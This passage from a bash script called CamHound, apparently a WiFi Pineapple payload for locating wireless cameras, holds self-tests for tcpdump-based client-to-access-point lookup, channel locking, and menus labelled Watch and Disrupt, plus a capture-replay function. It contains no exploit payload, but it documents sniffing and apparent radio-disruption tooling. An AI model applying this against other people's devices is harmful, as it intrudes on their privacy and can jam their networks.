  st "assoc lookup: the BSSID is read off the air" "$?:${AP_OF[$AS1]}:$ASSOC_N" "0:$ASB:3"
  st "assoc lookup: the radio was parked, so the next cycle is a baseline and the rate history restarts" \
     "$BASELINE_NEXT:${#PREV_PKT[@]}" "1:0"
  st "assoc lookup: it parked on the channel of the client's last-heard frequency, for the configured window" \
     "$(cat "$tmp/locks"):$(cat "$tmp/caps")" "36:$AS1 4"
  st "assoc lookup: the row takes its AP's channel and SSID at once" "${CH[$AS1]}:${SSID_CLEAN[$AS1]}" "36:ReoKit"
  st "assoc lookup: the lock is released, once" "$(cat "$tmp/unlocks")" "u"
  st "assoc lookup: logged with the count, the channel and the lock state" \
     "$(grep -c "assoc $AS1 -> $ASB n=3 .* ch=36 lock=ok" "$tmp/events.log")" "1"
  st "assoc: a resolved client is not looked up again, and is watchable" \
     "$(assoc_can "$AS1" && echo again):$(watchable "$AS1" && echo yes)" ":yes"
  resp_target "$AS1"
  st "assoc: resp_target's client branch passes on the learned AP" "$?:$R_BSSID:$R_TARGET:$R_CH" "0:$ASB:$AS1:36"
  # every failure names its own reason and teaches nothing
  st_device "$AS3" cli "Reolink Innovation Limited" "" 0; FREQ[$AS3]=5180; unset "CH[$AS3]"
  assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: one sighting is NO_PAIR, and nothing is learned" \
     "$?:$ASSOC_WHY:${AP_OF[$AS3]}:${ASSOC_BSS[$AS3]:-none}" "1:NO_PAIR:-:none"
  st_hex2bin "d4c3b2a1020004000000000000000000$(st_le32h 128)$(st_le32h 127)" >"$tmp/asc_hdr.pcap"; ST_PCAP="$tmp/asc_hdr.pcap"
  assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: armed and heard nothing is NO_FRAMES, said as a channel, never as 'unassociated'" \
     "$?:$ASSOC_WHY:$(printf '%s' "$ASSOC_TEXT" | grep -c 'not heard on ch 36')" "1:NO_FRAMES:1"
  printf 'not a pcap at all' >"$tmp/asc_bad.pcap"; ST_PCAP="$tmp/asc_bad.pcap"
  assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: an unreadable capture is NO_CAPTURE" "$?:$ASSOC_WHY" "1:NO_CAPTURE"
  ST_PCAP=""; rm -f "$tmp/unlocks"
  assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: a capture that did not arm is NO_CAPTURE, and the lock is still released" \
     "$?:$ASSOC_WHY:$(cat "$tmp/unlocks")" "1:NO_CAPTURE:u"
  st_hex2bin "d4c3b2a1020004000000000000000000$(st_le32h 20)$(st_le32h 127)$(st_le32h 0)$(st_le32h 0)$(st_le32h 20)$(st_le32h 42)0000120000000000000000000000000000000801" >"$tmp/asc_trunc.pcap"
  ST_PCAP="$tmp/asc_trunc.pcap"; assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: records cut below the addresses are SNAP_SHORT, naming the constant" \
     "$?:$ASSOC_WHY:$(printf '%s' "$ASSOC_TEXT" | grep -c CLI_CAP_SNAP)" "1:SNAP_SHORT:1"
  st_assoc_pcap "$tmp/asc_two.pcap" ec71db000013 "$ASH:4" aa0000000099:2; ST_PCAP="$tmp/asc_two.pcap"
  assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: two BSSIDs, the second with half the first's count, is AMBIGUOUS" \
     "$?:$ASSOC_WHY:${AP_OF[$AS3]}" "1:AMBIGUOUS:-"
  # the same two BSSIDs with the counts exchanged: awk's for-in order is fixed per key, so between
  # them these two cases meet the runner-up both before and after the leader
  st_assoc_pcap "$tmp/asc_two_b.pcap" ec71db000013 "$ASH:2" aa0000000099:4; ST_PCAP="$tmp/asc_two_b.pcap"
  assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: and is AMBIGUOUS whichever of the two the walker prints first" \
     "$?:$ASSOC_WHY:${AP_OF[$AS3]}" "1:AMBIGUOUS:-"
  st_assoc_pcap "$tmp/asc_one.pcap" ec71db000013 "$ASH:5" aa0000000099:2; ST_PCAP="$tmp/asc_one.pcap"
  assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: a clear majority decides" "$?:${AP_OF[$AS3]}:$ASSOC_N" "0:$ASB:5"
  # the three lock outcomes, and no channel at all
  st_device "$AS4" cli "Reolink Innovation Limited" "" 0; FREQ[$AS4]=5180; unset "CH[$AS4]"
  rm -f "$tmp/events.log" "$tmp/caps" "$tmp/unlocks"; ST_PCAP="$tmp/asc.pcap"; ST_LRC=2
  assoc_lookup "$AS4" >/dev/null 2>&1
  st "assoc lookup: a radio that will not park is listened to across the hop, three windows long" \
     "$?:$(cat "$tmp/caps"):$(grep -c 'lock=hop' "$tmp/events.log")" "0:$AS4 12:1"
  st "assoc lookup: and the failed park is released before that listen" "$(cat "$tmp/unlocks")" "u"
  AP_OF[$AS4]=-; unset "ASSOC_BSS[$AS4]" "CH[$AS4]"; rm -f "$tmp/events.log"; ST_LRC=3
  assoc_lookup "$AS4" >/dev/null 2>&1
  st "assoc lookup: an unverified park proceeds, and is labelled" "$?:$(grep -c 'lock=unverified' "$tmp/events.log")" "0:1"
  st_device aa:00:00:00:00:21 cli "Acme" "" 0; unset "FREQ[aa:00:00:00:00:21]" "CH[aa:00:00:00:00:21]"
  rm -f "$tmp/caps" "$tmp/locks"; ST_LRC=0; BASELINE_NEXT=0; PREV_PKT=(); PREV_PKT[$ASB]=5
  assoc_lookup aa:00:00:00:00:21 >/dev/null 2>&1
  st "assoc lookup: no channel known means no lock is tried, and the hop is listened across" \
     "$?:$ASSOC_WHY:$([ -e "$tmp/locks" ] && echo locked):$(cat "$tmp/caps")" "1:NO_PAIR::aa:00:00:00:00:21 12"
  st "assoc lookup: and with the hop never held, the cycle after it is an ordinary one" "$BASELINE_NEXT:${#PREV_PKT[@]}" "0:1"
  BASELINE_NEXT=1; PREV_PKT=()
  # heard across the hop, on an AP Recon never listed: the AP is learned, its channel is not guessed
  st_device aa:00:00:00:00:52 cli "Acme" "" 0; FREQ[aa:00:00:00:00:52]=2437; unset "CH[aa:00:00:00:00:52]"
  st_assoc_pcap "$tmp/asc_norow.pcap" aa0000000052 aa0000000097:3; ST_PCAP="$tmp/asc_norow.pcap"; ST_LRC=2
  assoc_lookup aa:00:00:00:00:52 >/dev/null 2>&1
  st "assoc lookup: an AP heard across the hop that Recon never listed is learned without a channel" \
     "$?:${AP_OF[aa:00:00:00:00:52]}:${CH[aa:00:00:00:00:52]:-none}:${ASSOC_CH[aa:00:00:00:00:52]:-none}" "0:aa:00:00:00:00:97:none:none"
  st "assoc lookup: so its Disrupt row says there is no channel, instead of transmitting on a guess" \
     "$(disrupt_row aa:00:00:00:00:52)" "Disrupt n/a (no channel)"
  # lock_target takes a channel of 0 as "any channel will do", so a Watch here would park wherever
  # the radio happened to be, warn about nothing, and loot a row for channel 0
  st "assoc lookup: nor is Watch offered on it: with no channel the lock has nothing to verify against" \
     "$(assoc_nochan aa:00:00:00:00:52 && echo nochan):$(watchable aa:00:00:00:00:52 && echo watchable)" "nochan:"
  ROLE[aa:00:00:00:00:97]=ap; CH[aa:00:00:00:00:97]=11
  st "assoc lookup: once Recon lists that AP the row has a channel again, and both come back" \
     "$(assoc_nochan aa:00:00:00:00:52 && echo nochan):$(watchable aa:00:00:00:00:52 && echo watchable):$(disrupt_row aa:00:00:00:00:52)" ":watchable:Disrupt"
  unset "ROLE[aa:00:00:00:00:97]" "CH[aa:00:00:00:00:97]"
  AP_OF[aa:00:00:00:00:52]=-; unset "ASSOC_BSS[aa:00:00:00:00:52]"; ST_LRC=3
  assoc_lookup aa:00:00:00:00:52 >/dev/null 2>&1
  st "assoc lookup: nor is one recorded behind a park that could not be read back" \
     "$?:${AP_OF[aa:00:00:00:00:52]}:${CH[aa:00:00:00:00:52]:-none}" "0:aa:00:00:00:00:97:none"
  AP_OF[aa:00:00:00:00:52]=-; unset "ASSOC_BSS[aa:00:00:00:00:52]"; ST_LRC=0
  assoc_lookup aa:00:00:00:00:52 >/dev/null 2>&1
  st "assoc lookup: a verified park is the one case where the channel listened on is the BSS's" \
     "$?:${AP_OF[aa:00:00:00:00:52]}:${CH[aa:00:00:00:00:52]:-none}:$(watchable aa:00:00:00:00:52 && echo watchable)" "0:aa:00:00:00:00:97:6:watchable"
  ST_LRC=2; assoc_lookup aa:00:00:00:00:52 >/dev/null 2>&1
  st "assoc lookup: the same AP heard again across the hop keeps the channel that was verified" \
     "$?:${AP_OF[aa:00:00:00:00:52]}:${CH[aa:00:00:00:00:52]:-none}:${ASSOC_CH[aa:00:00:00:00:52]:-none}" "0:aa:00:00:00:00:97:6:6"
  ST_PCAP="$tmp/asc.pcap"; ST_LRC=0
  assoc_lookup "$ASB" >/dev/null 2>&1
  st "assoc lookup: an AP row is refused before anything is touched" "$?:$ASSOC_WHY" "1:NOT_CLIENT"
  HAVE_TCPDUMP=0; assoc_lookup "$AS3" >/dev/null 2>&1
  st "assoc lookup: no capture tool is NO_CAPTURE" "$?:$ASSOC_WHY" "1:NO_CAPTURE"
  ASSOC_TS[$AS1]=$((EPOCHSECONDS - 400)); ASSOC_TRY[$AS1]=$((EPOCHSECONDS - 400))
  st "assoc: with no capture tool no lookup is offered, and an old answer is not called stale" \
     "$(assoc_can aa:00:00:00:00:21 && echo can):$(assoc_stale "$AS1" && echo stale)" ":"
  HAVE_TCPDUMP=1
  st "assoc: with one, both are" "$(assoc_can aa:00:00:00:00:21 && echo can):$(assoc_stale "$AS1" && echo stale)" "can:stale"
  ASSOC_TS[$AS1]=$EPOCHSECONDS; ASSOC_TRY[$AS1]=$EPOCHSECONDS
  # what may and may not be learned
  st_device aa:00:00:00:00:31 cli "Acme" "" 0 aa:00:00:00:00:30
  assoc_learn aa:00:00:00:00:31 "$ASB" 36 air
  st "assoc learn: an AP the firmware supplied is not overwritten" \
     "${AP_OF[aa:00:00:00:00:31]}:${ASSOC_BSS[aa:00:00:00:00:31]}" "aa:00:00:00:00:30:$ASB"
  unset "CH[aa:00:00:00:00:31]" "CH[aa:00:00:00:00:30]"
  st "assoc: a firmware-supplied AP with no channel is not the no-channel state: Watch locks by BSSID there, as in the hooks" \
     "$(assoc_nochan aa:00:00:00:00:31 && echo nochan):$(watchable aa:00:00:00:00:31 && echo watchable)" ":watchable"
  assoc_learn aa:00:00:00:00:32 "$ASB" 0 members
  st "assoc learn: a station with no row is remembered for run_cycle, and no row is invented" \
     "${ASSOC_BSS[aa:00:00:00:00:32]}:${ROLE[aa:00:00:00:00:32]:-none}" "$ASB:none"
  assoc_learn "$ASB" "$ASB" 36 air; st "assoc learn: a station is never its own AP" "$?" 1
  assoc_learn "$ASB" aa:00:00:00:00:30 36 air
  st "assoc learn: an AP row is never given an AP" "${AP_OF[$ASB]:--}" "-"
  assoc_learn junk "$ASB" 36 air; st "assoc learn: a malformed MAC is refused" "$?" 1
  st_device aa:00:00:00:00:51 cli "Acme" "" 0; unset "CH[aa:00:00:00:00:51]"
  assoc_learn aa:00:00:00:00:51 "$ASB" 6 air
  st "assoc learn: the AP's own row wins over the channel listened on, and is what is remembered" \
     "${CH[aa:00:00:00:00:51]}:${ASSOC_CH[aa:00:00:00:00:51]}:${SSID_CLEAN[aa:00:00:00:00:51]}" "36:36:ReoKit"
  assoc_learn aa:00:00:00:00:51 aa:00:00:00:00:96 0 air
  st "assoc learn: a move to an AP with no row drops the old AP's channel and SSID rather than carrying them over" \
     "${AP_OF[aa:00:00:00:00:51]}:${CH[aa:00:00:00:00:51]:-none}:${ASSOC_CH[aa:00:00:00:00:51]:-none}:${SSID_CLEAN[aa:00:00:00:00:51]:-none}" \
     "aa:00:00:00:00:96:none:none:none"
  assoc_learn aa:00:00:00:00:51 "$ASB" 0 members; assoc_learn aa:00:00:00:00:51 "$ASB" 0 air
  st "assoc learn: hearing the same AP again without a channel keeps the one it had" \
     "${AP_OF[aa:00:00:00:00:51]}:${CH[aa:00:00:00:00:51]}:${SSID_CLEAN[aa:00:00:00:00:51]}" "$ASB:36:ReoKit"
  st_device ec:71:db:00:00:12 cli "Reolink Innovation Limited" "" 0
  RESP_MEMBERS=(); RESP_MEMBERS[ec:71:db:00:00:12]=1; RESP_MEMBERS[aa:00:00:00:00:33]=1; RESP_MEMBERS_BSS="$ASB"
  rm -f "$tmp/events.log"; assoc_learn_members "$ASB"
  st "assoc members: a membership capture gives each client row it heard its AP" \
     "${AP_OF[ec:71:db:00:00:12]}:${CH[ec:71:db:00:00:12]}:${ASSOC_SRC[ec:71:db:00:00:12]}" "$ASB:36:members"
  st "assoc members: the log says how many were heard and how many client rows now carry the AP (one of the two has no row)" \
     "$(grep -c "members of $ASB: 2 heard, 1 client row(s) now carry this AP" "$tmp/events.log")" "1"
  AP_OF[ec:71:db:00:00:12]=-; unset "ASSOC_BSS[ec:71:db:00:00:12]"
  assoc_learn_members aa:00:00:00:00:99
  st "assoc members: a set gathered for another BSSID teaches nothing" "${AP_OF[ec:71:db:00:00:12]}" "-"
  RESP_MEMBERS=(); RESP_MEMBERS_BSS=''
  # a learned AP is looked at again before it is acted on, once it is older than ASSOC_TTL
  ASSOC_TS[$AS1]=$EPOCHSECONDS; ASSOC_TRY[$AS1]=$EPOCHSECONDS
  st "assoc refresh: a fresh answer is not looked up again" "$(assoc_stale "$AS1" && echo stale)" ""
  ASSOC_TS[$AS1]=$((EPOCHSECONDS - 400)); ASSOC_TRY[$AS1]=$((EPOCHSECONDS - 400))
  st "assoc refresh: one older than ASSOC_TTL is" "$(assoc_stale "$AS1" && echo stale)" "stale"
  ASSOC_TS[aa:00:00:00:00:31]=$((EPOCHSECONDS - 400)); ASSOC_TRY[aa:00:00:00:00:31]=$((EPOCHSECONDS - 400))
  st "assoc refresh: an AP the firmware supplied is never re-checked, however old the one heard beside it" \
     "${AP_OF[aa:00:00:00:00:31]}:$(assoc_stale aa:00:00:00:00:31 && echo stale)" "aa:00:00:00:00:30:"
  st_assoc_pcap "$tmp/asc_moved.pcap" ec71db000011 aa0000000098:3; ST_PCAP="$tmp/asc_moved.pcap"; ST_LRC=0; rm -f "$tmp/locks"
  FREQ[$AS1]=2437        # last heard on ch 6 (a scanning client is heard off-channel): the row's channel is its AP's, and wins
  assoc_refresh "$AS1" >/dev/null 2>&1
  st "assoc refresh: the re-check listens on the AP's channel, not where the client was last heard, and a different BSSID replaces the old one" \
     "$(cat "$tmp/locks"):${AP_OF[$AS1]}:${CH[$AS1]}:${SSID_CLEAN[$AS1]:-none}" "36:aa:00:00:00:00:98:36:none"
  ASSOC_TS[$AS1]=$((EPOCHSECONDS - 400)); ASSOC_TRY[$AS1]=$((EPOCHSECONDS - 400)); ST_PCAP="$tmp/asc_hdr.pcap"
  assoc_refresh "$AS1" >/dev/null 2>&1
  st "assoc refresh: hearing nothing keeps the AP, and is not tried again at once" \
     "${AP_OF[$AS1]}:$(assoc_stale "$AS1" && echo stale)" "aa:00:00:00:00:98:"
  ASSOC_TTL=0
  st "assoc refresh: ASSOC_TTL=0 looks every time" "$(assoc_stale "$AS1" && echo stale)" "stale"
  ASSOC_TTL=300
  # The re-check lives in the two menus, not at the card, so the scan funnel's Watch offers, the
  # post-Watch Disrupt offer and AUTO_RESPOND get it as well. LIST_PICKER is stubbed to cancel, so
  # watch_menu returns at its picker; the AP row has no channel, so disrupt_menu returns at resp_target.
  local _orf; _orf=$(declare -f assoc_refresh)
  assoc_refresh() { printf '%s ' "$1" >>"$tmp/refresh"; }
  st_device aa:00:00:00:00:70 ap "Acme" "NoChan" 0; unset "CH[aa:00:00:00:00:70]"
  rm -f "$tmp/refresh"; watch_menu "$AS1" >/dev/null 2>&1; disrupt_menu aa:00:00:00:00:70 >/dev/null 2>&1
  st "assoc refresh: Watch and Disrupt both look again on the way in, whichever path opened them" \
     "$(cat "$tmp/refresh" 2>/dev/null)" "$AS1 aa:00:00:00:00:70 "
  eval "$_orf"
  # the listen window has a ceiling as well as a floor: it parks the radio and holds the screen
  local _cn="$CFG_NOTE" _co=$CFG_OVERRIDES
  ASSOC_CAP_SECS=500; assoc_clamp >/dev/null 2>&1; st "assoc clamp: a listen window above the ceiling is capped" "$ASSOC_CAP_SECS" "30"
  ASSOC_CAP_SECS=1; assoc_clamp >/dev/null 2>&1;   st "assoc clamp: one below the floor is raised" "$ASSOC_CAP_SECS" "2"
  ASSOC_CAP_SECS=6; assoc_clamp >/dev/null 2>&1;   st "assoc clamp: one in range is left alone" "$ASSOC_CAP_SECS" "6"
  settings_apply ASSOC_CAP_SECS 500 >/dev/null 2>&1
  st "settings: a capped listen window is what is in force, and what the override note says" \
     "$ASSOC_CAP_SECS:$(printf '%s' "$CFG_NOTE" | grep -c 'ASSOC_CAP_SECS=30')" "30:1"
  ASSOC_CAP_SECS=500; load_overrides >/dev/null 2>&1
  st "assoc clamp: runs from load_overrides too, so a config-block edit is covered" "$ASSOC_CAP_SECS" "30"
  CFG_NOTE="$_cn"; CFG_OVERRIDES=$_co; ASSOC_CAP_SECS=4
  # the card's two rows, for the three states a client row can be in. LIST_PICKER records what it was
  # handed and cancels, so detail_card draws once and returns.
  local _resp=$RESPONSE; RESPONSE=1
  LIST_PICKER() { printf '%s\n' "$*" >>"$tmp/picker"; return 1; }
  st_device aa:00:00:00:00:53 cli "Acme" "" 0; unset "CH[aa:00:00:00:00:53]" "FREQ[aa:00:00:00:00:53]"
  assoc_learn aa:00:00:00:00:53 aa:00:00:00:00:94 0 air          # heard across the hop, on an AP Recon has not listed
  rm -f "$tmp/picker"
  detail_card aa:00:00:00:00:21 >/dev/null 2>&1; detail_card aa:00:00:00:00:53 >/dev/null 2>&1; detail_card "$AS1" >/dev/null 2>&1
  st "card: no AP offers the lookup on both rows; an AP with no channel says so on both; a resolved client gets Watch and Disrupt" \
     "$(grep -c ' 00:00:21 Watch (find AP first) Disrupt (find AP first) Locate ' "$tmp/picker" 2>/dev/null):$(grep -c ' 00:00:53 Watch n/a (no channel) Disrupt n/a (no channel) Locate ' "$tmp/picker" 2>/dev/null):$(grep -c " ${AS1:9} Watch Disrupt Locate " "$tmp/picker" 2>/dev/null)" "1:1:1"
  LIST_PICKER() { return 1; }; RESPONSE=$_resp
  # the report: an AP named only by a client's own frames is not a hidden-SSID AP
  _f2=$( RUN_ID=st7m; CYCLE=1; RUN_T0=$EPOCHSECONDS; write_report quiet >/dev/null 2>&1      # a quiet report is skipped before the first cycle
         printf '%s:%s' "$(grep -c '^aa:00:00:00:00:97 <not listed> ' "$tmp/report_st7m.txt" 2>/dev/null)" "$(grep -c "^$ASB ReoKit " "$tmp/report_st7m.txt" 2>/dev/null)" )
  st "report: an AP read off the air that Recon never listed is <not listed>, not <hidden>; a listed one keeps its SSID" "$_f2" "1:1"
  rm -f "$tmp/report_st7m.txt"
  # run_cycle: the firmware's client row says "-" every cycle, so the learned AP is re-applied there
  _f2=$( recon_lines() { case "$1" in
           APS) printf '%s|9|ReoKit|36|5180|-50|0|5\n' "$ASB" ;;
           CLIENTS) printf '%s|-|7|-60||2437|5|0\naa:00:00:00:00:31|aa:00:00:00:00:30|7|-60||2437|5|0\naa:00:00:00:00:41|-|7|-60||2437|5|0\naa:00:00:00:00:61|aa:00:00:00:00:60|7|-60||2437|5|0\n' "$AS4" ;;
         esac; }
         gps_tick() { :; }; battery_tick() { :; }; upsert_inventory() { :; }; write_report() { :; }
         ASSOC_BSS=(); ASSOC_CH=(); AP_OF=(); CH=()
         assoc_learn "$AS4" "$ASB" 36 air; assoc_learn aa:00:00:00:00:31 "$ASB" 36 air; assoc_learn aa:00:00:00:00:41 aa:00:00:00:00:40 44 air
         assoc_learn aa:00:00:00:00:61 aa:00:00:00:00:62 44 air      # heard on one AP; the firmware then names another, with no row of its own
         run_cycle >/dev/null 2>&1
         printf '%s|%s|%s|%s|%s|%s|%s|%s' "${AP_OF[$AS4]}" "${CH[$AS4]}" "${CLIENTS_OF[$ASB]}" "${AP_OF[aa:00:00:00:00:31]}" "${AP_OF[aa:00:00:00:00:41]}" "${CH[aa:00:00:00:00:41]}" \
                "${AP_OF[aa:00:00:00:00:61]}" "${CH[aa:00:00:00:00:61]:-none}" )
  st "run_cycle: a learned AP survives the firmware's '-', feeds the kit list, yields to a firmware one, and brings its channel only to its own AP" \
     "$_f2" "$ASB|36| $AS4|aa:00:00:00:00:30|aa:00:00:00:00:40|44|aa:00:00:00:00:60|none"
  # the real capture, once, against a tcpdump that writes a file: the filter and the bookkeeping
  eval "$_oc"; unset -f sleep; CHILD_FILE="$tmp/children"; : >"$CHILD_FILE"
  tcpdump() { local o=''; printf '%s\n' "$*" >>"$tmp/tcpargs"; while [ $# -gt 0 ]; do [ "$1" = -w ] && o="$2"; shift; done; printf 'x' >"$o"; sleep 2; }
  rm -f "$tmp/tcpargs"; _f2=$(assoc_capture "$AS1" 1)
  st "assoc capture: returns the file tcpdump wrote, and leaves no pid registered" \
     "$?:$([ -s "$_f2" ] && echo file):$(cat "$CHILD_FILE")" "0:file:"
  st "assoc capture: filtered on the client, addr2 first, with the membership capture's snap and frame cap" \
     "$(grep -c -- "-s $CLI_CAP_SNAP -c $CLI_CAP_COUNT .*type data and (wlan addr2 $AS1 or wlan addr1 $AS1)\$" "$tmp/tcpargs")" "1"
  rm -f "$_f2"
  tcpdump() { local o='' a="$*"; printf '%s\n' "$a" >>"$tmp/tcpargs"; case "$a" in *"(wlan addr2"*) return 1 ;; esac; while [ $# -gt 0 ]; do [ "$1" = -w ] && o="$2"; shift; done; printf 'x' >"$o"; sleep 2; }
  rm -f "$tmp/tcpargs"; _f2=$(assoc_capture "$AS1" 1)
  st "assoc capture: when the OR filter will not arm it retries on the uplink alone" \
     "$?:$(grep -c "type data and wlan addr2 $AS1\$" "$tmp/tcpargs")" "0:1"
  rm -f "$_f2"; unset -f tcpdump; CHILD_FILE="$_cf"
  eval "$_ol"; eval "$_ou"
  if [ -n "$_oi" ]; then eval "$_oi"; else unset -f iwinfo; fi
  if [ -n "$_ow" ]; then eval "$_ow"; else unset -f iw; fi
  PINEAPPLE_EXAMINE_CHANNEL() { :; }
  HAVE_TCPDUMP=$_tcp; ASSOC_CAP_SECS=$_secs; ASSOC_TTL=$_ttl; unset ST_PCAP ST_LRC
  ASSOC_BSS=(); ASSOC_CH=(); ASSOC_TS=(); ASSOC_TRY=(); ASSOC_SRC=()
  st "stubs: still stubbed after the last case, so no teardown exposed a real command" "$(st_stubs_intact)" "none"
  # 8 marked blocks
  if command -v md5sum >/dev/null 2>&1 && [ -f "${BASH_SOURCE[0]}" ]; then
    printf 'lib block md5   %s\n' "$(sed -n '/^# --- camhound lib begin ---/,/^# --- camhound lib end ---/p' "${BASH_SOURCE[0]}" | md5sum | cut -c1-32)"
    printf 'watch block md5 %s\n' "$(sed -n '/^# --- watch core begin ---/,/^# --- watch core end ---/p' "${BASH_SOURCE[0]}" | md5sum | cut -c1-32)"
  fi
  rm -rf "$tmp"
  printf '== %s checks, %s failed ==\n' "$ST_N" "$ST_FAIL"
  return $(( ST_FAIL > 0 ))
}
# raw_up_rows <raw_<run>.txt> -> the up-direction bucket rows of every window; a header-less bucket file passes through unchanged
# (window_metrics appends '# <epoch> up <mac>', the up rows, '# dn', the dn rows per window)
raw_up_rows() { awk 'BEGIN { d = 1 } /^#/ { d = ($3 == "up"); next } d' "$1"; }
replay() {   # --replay <pcap, bucket or raw file>
  local f="$1" m; st_stub_ui
  [ -r "$f" ] || { printf 'replay: cannot read %s\n' "$f"; return 1; }
  m=$(pcap_words "$f" | head -1)
  case "$m" in 2712847316|2712812077|3569595041|1295823521) pcap_buckets "$f" >/tmp/cs_replay.b || { printf 'parse error\n'; return 1; } ;; *) raw_up_rows "$f" >/tmp/cs_replay.b ;; esac
  read -r WM_USEC WM_UF WM_UB WM_UG _ WM_UCV <<<"$(bucket_stats /tmp/cs_replay.b)"
  local r10=0; (( WM_USEC > 0 )) && r10=$(( WM_UG * 10 / WM_USEC ))
  printf 'secs %s frames %s bytes %s big %s big/s %s cv %s\n' "$WM_USEC" "$WM_UF" "$WM_UB" "$WM_UG" "$(fmt10 "$r10")" "$( (( WM_UCV >= 0 )) && fmt10 "$WM_UCV" || printf -)"
  if (( r10 >= THR_STREAM_UP * 10 )) && { (( WM_UCV < 0 )) || (( WM_UCV <= THR_CV10 )); }; then printf 'badge: STREAM-rate (asym unknown from one file)\n'
  elif (( r10 < 20 )); then printf 'badge: IDLE-rate\n'; else printf 'badge: NONE\n'; fi
  rm -f /tmp/cs_replay.b
}

# ============================================================================== preflight ===


# =================================================================================== main ===
case "${1:-}" in
  --selftest) selftest; exit $? ;;
  --replay)   replay "${2:-}"; exit $? ;;
  -h|--help)  printf 'CamHound %s: run from the Pager UI. Laptop: --selftest | --replay <pcap|bucket|raw file>\n' "$VERSION"; exit 0 ;;
esac
set_state SETUP
INSTALL_DIR=$(find_install_dir) || INSTALL_DIR=""
run_lock
preflight
apply_mode
cfg_snapshot_defaults
load_overrides
bands_recover; [ "$BAND6" = 1 ] && bands_apply
# A fresh Recon session, so a run reports what is transmitting NOW rather than everything the
# daemon has accumulated since boot. It also keeps the device count low, which matters because the
# per-cycle cost scales with it. Side effect worth being loud about: this wipes the Recon session
# for anything ELSE using it, so it is starred and can be turned off in Settings -> Recon.
if [ "$RECON_FRESH" = 1 ] && command -v PINEAPPLE_RECON_NEW >/dev/null 2>&1; then
  PINEAPPLE_RECON_NEW >/dev/null 2>&1
  log recon "RECON_FRESH: new session requested at start (previous recon list discarded)"
  ui_ok && LOG yellow "fresh Recon session: this run shows what is transmitting now"
fi
(( CFG_OVERRIDES > 0 )) && { LOG yellow "cfg: $CFG_OVERRIDES overrides"; log cfg "$CFG_NOTE"; }
log run "start v$VERSION run=$RUN_ID sigs=$SIG_COUNT($SIG_SOURCE) jq=$HAVE_JQ tcpdump=$HAVE_TCPDUMP bands=${BANDS_LINE:-?} mode=$MODE loaded=$LOADED_ROWS dedupe_h=$DEDUPE_H"
LOG "CamHound $VERSION [$MODE]"$'\n'"sigs: $SIG_COUNT ($SIG_SOURCE)$( [ "$HAVE_JQ" = 1 ] || printf ' no-jq')$( [ "$HAVE_TCPDUMP" = 1 ] || printf ' no-tcpdump')"$'\n'"bands: ${BANDS_LINE:-?}"$'\n'"prox: uncal"
[ "$HAVE_TCPDUMP" = 1 ] || LOG yellow "no tcpdump (or no hexdump/od): Watch disabled"
main_menu
REPORT_DONE_AT_EXIT=1; write_report quiet
exit 0
